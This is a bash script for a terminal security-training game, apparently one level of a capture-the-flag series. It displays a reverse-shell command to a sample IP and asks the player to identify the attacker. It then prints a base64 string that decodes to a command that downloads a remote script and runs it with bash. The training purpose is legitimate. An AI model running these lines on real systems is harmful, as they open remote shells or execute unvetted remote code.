#!/bin/bash
clear
echo -e "\e[96m┌───────────────────────────────────────────┐"
echo -e "\e[96m│        LEVEL 5: REVERSE SHELL SIM         │"
echo -e "\e[96m└───────────────────────────────────────────┘\e[0m"

echo -e "\e[92m[*] You intercepted a suspicious reverse shell command:\e[0m"
cmd="bash -i >& /dev/tcp/192.168.1.9/4444 0>&1"
echo -e "\e[93mCommand: $cmd\e[0m"
echo
read -p $'\e[93m[?] What IP address was the attacker using? \e[0m' ip

if [[ "$ip" == "192.168.1.9" ]]; then
    echo -e "\e[92m[✓] Correct. Moving to Level 6.\e[0m"
    echo -e "\e[94m[->] Decrypt this base64 line\e[0m"
    echo -e "\e[92md2dldCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQ1lCRVItTVJJTkFML0hJRERF Ti1TQ1JJUFQvbWFzdGVyL2xldmVsNi5zaCAmJiBiYXNoIGxldmVsNi5zaA==\e[0m"
else
    echo -e "\e[91m[✗] Incorrect. Analyze carefully.\e[0m"
fi
